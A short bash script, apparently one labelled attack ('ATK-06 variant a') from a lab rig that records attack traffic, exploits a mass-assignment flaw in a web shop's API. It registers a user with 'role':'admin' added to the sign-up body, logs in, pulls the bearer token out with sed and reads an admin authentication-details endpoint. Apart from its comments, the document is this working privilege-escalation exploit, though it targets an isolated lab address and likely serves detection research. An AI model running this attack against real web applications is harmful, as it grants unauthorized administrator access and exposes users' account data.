#!/usr/bin/env bash
# ATK-06 variant a: registers his own admin through the sign-up API by adding "role":"admin" (mass
# assignment), logs in with it and opens the admin page's data. curl's own user agent (loud).
# Runs inside the rig's tools container only (recording/record.sh).
# tool: curl 8.x
# label: loud: mass-assignment admin sign-up, then login, curl user agent
set -eu
shop=http://10.66.0.10
curl -s -X POST $shop/api/Users -H 'Content-Type: application/json' \
  --data-raw '{"email":"reaper@example.org","password":"Memento-M0ri","passwordRepeat":"Memento-M0ri","role":"admin"}'
echo
token=$(curl -s -X POST $shop/rest/user/login -H 'Content-Type: application/json' \
  --data-raw '{"email":"reaper@example.org","password":"Memento-M0ri"}' | sed -E 's/.*"token":"([^"]+)".*/\1/')
curl -s $shop/rest/user/authentication-details/ -H "Authorization: Bearer $token" | head -c 300
echo
